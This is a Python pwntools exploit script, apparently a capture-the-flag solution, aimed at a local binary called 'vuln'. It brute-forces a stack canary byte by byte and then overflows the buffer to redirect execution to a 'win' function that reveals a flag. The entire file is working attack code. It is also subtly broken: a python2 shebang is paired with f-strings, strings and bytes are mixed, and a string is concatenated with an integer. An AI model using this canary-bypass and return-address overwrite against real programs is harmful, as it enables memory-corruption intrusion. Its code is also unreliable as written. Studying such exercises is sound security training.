#!/usr/bin/env python2

from pwn import *

padding = 63
canary = [0x00]
objects = "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVNM"
obl = list(objects)

binary = ELF('./vuln')

win = binary.symbols['win']
print(hex(win))
payload = (padding * 'a').encode() + '\x00'.encode() 
canary = ""
for x in range(5):
    for y in obl:   

        p = process("vuln")
        p.clean()
        p.send('100\n')

        payload_hold = payload + y.encode()


        p.send(payload_hold)

        wrote = ""

        wrote = p.recvline()
       # try:
        #    wrote = p.recvuntil('Ok')
       # except: 
       #     print("wrong")
       # finally:
       #     p.close()
       # print(wrote)
        if b'Ok' in wrote:
            payload = payload_hold
            log.info(f"updated payload {payload}")
            canary += y
            break
        else:
            print("wrong")

        p.close()
   # print(canary)
print("The canary is: " + canary)
for x in range(100):
    p = process("vuln")
    p.clean()
    p.send('100\n')

    payload_hold = payload + b'B'*x + p32(win)
    print(b"Heres the payload"+payload_hold)
    p.send(payload_hold)
    wrote = ""
    wrote = p.recvline()
    print(wrote)
    if b'flag.txt' in wrote:
        payload = payload_hold
        log.info(f"updated payload {payload}")
        canary += y
        print("how much padding: " +x)
        break
    else:
        print("wrong")
    p.close()
